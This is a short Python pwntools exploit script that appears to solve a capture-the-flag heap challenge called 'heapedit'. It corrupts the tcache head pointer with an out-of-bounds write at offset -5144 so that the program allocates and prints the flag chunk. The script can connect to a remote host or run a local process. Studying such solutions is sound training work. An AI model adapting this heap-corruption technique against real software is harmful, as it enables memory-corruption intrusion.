#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template heapedit
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'heapedit')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'./'
# Stripped:   No

log.info("""we've got two chunks, one with the flag and one with the loser string. after free, tcache looks like this:

        tcache[0x80] bin:

        head
         |
         v
     +---------+
     | loser   |
     |---------|
     | next ---+-----> +---------+
     +---------+       | flag    |
                       |---------|
                       | next ---+-----> NULL
                       +---------+

because the heap is relatively quiet, head is -5144 bytes from flag's data chunk. loser is 80 bytes after flag's data chunk.
so if we overwrite head's least significant byte with 0x00 (again quiet heap, this is predictable) we can make flag the top
of the singly linked list and cause it to be what gets allocated and printed.""")

io = start()

io.sendline(b"-5144")
io.sendline(b"\0")

io.interactive()

